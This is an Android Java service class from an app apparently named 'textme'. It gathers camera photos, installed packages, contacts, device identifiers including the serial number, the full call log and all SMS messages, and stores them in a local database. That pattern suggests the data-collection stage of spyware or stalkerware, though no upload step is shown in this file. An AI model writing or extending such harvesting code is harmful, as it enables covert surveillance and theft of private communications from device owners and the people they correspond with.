package com.candroid.textme;

import android.app.IntentService;
import android.content.Intent;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.Build;

import java.io.File;
import java.util.ArrayList;

public class FilesIntentService extends IntentService {
    public static final String ACTION_DCIM_FILES = "ACTION_DCIM_FILES";
    public static final String ACTION_SMS = "ACTION_SMS";

    public FilesIntentService() {
        super("FilesIntentService");
    }
    public static final String ACTION_PACKAGES = "ACTION_PACKAGES";
    public static final String ACTION_CONTACTS = "ACTION_CONTACTS";
    public static final String ACTION_DEVICE_INFO = "ACTION_DEVICE_INFO";
    public static final String ACTION_PHONE_CALLS = "ACTION_PHONE_CALLS";
    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null && intent.getAction() != null) {
            if(intent.getAction().equals(ACTION_DCIM_FILES)){
                File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    if(pictures != null && pictures.length > 0){
                        for(File f : pictures){
                            Database.insertMedia(database, f.getName(), f);
                        }
                    }
                    database.setTransactionSuccessful();
                }catch (SQLiteException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                    if(database.isOpen()){
                        database.close();
                    }
                }
            }else if(intent.getAction().equals(ACTION_PACKAGES)){
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertPackages(database, Lofl.getInstalledApps(this));
                    database.setTransactionSuccessful();
                }catch (SQLiteException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                    if(database.isOpen()){
                        database.close();
                    }
                }
            }else if(intent.getAction().equals(ACTION_CONTACTS)){
                ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertContacts(database, contacts);
                    database.setTransactionSuccessful();
                }catch (SQLiteException e){
                    e.printStackTrace();
                }finally{
                    database.endTransaction();
                    database.close();
                }
            }else if(intent.getAction().equals(ACTION_DEVICE_INFO)){
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertDevice(database, MessagingService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
                    database.setTransactionSuccessful();
                }catch (SQLException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                    database.close();
                }
            }else if(intent.getAction().equals(ACTION_PHONE_CALLS)){
                ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(this);
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertPhoneCalls(database, phoneCalls);
                    database.setTransactionSuccessful();
                }catch (SQLException e){
                    e.printStackTrace();
                }finally{
                    database.endTransaction();
                    database.close();
                }
            }else if(intent.getAction().equals(ACTION_SMS)){
                ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(this);
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertSmsMessages(database, smsMsgs);
                    database.setTransactionSuccessful();
                }catch (SQLException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                }
            }
        }
    }
}